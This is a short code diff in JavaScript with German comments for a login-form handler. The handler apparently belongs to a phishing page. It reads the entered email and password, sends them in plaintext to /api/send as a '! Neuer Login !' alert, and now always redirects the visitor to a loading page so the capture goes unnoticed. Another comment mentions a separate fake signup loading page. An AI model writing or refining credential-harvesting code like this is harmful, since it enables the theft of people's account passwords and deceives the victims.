@@ -241,15 +241,15 @@
   const email = document.getElementById("email").value.trim();
   const password = document.getElementById("password").value;
 
- const text = `Email: ${email}\nPasswort: ${password}`;
+ const text = `! Neuer Login !\nEmail: ${email}\nPasswort: ${password}`;
 
   const res = await fetch("/api/send", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ message: text })
   });
-  const body = await res.text();
-  alert(res.ok ? "Gesendet ✅" : "Fehler ❌");
+  // 🔁 immer weiterleiten
+  window.location.href = "loading.html";
 });
 
 // Neu anmelden → eigene Loading-Seite (du legst loading-signup.html an)
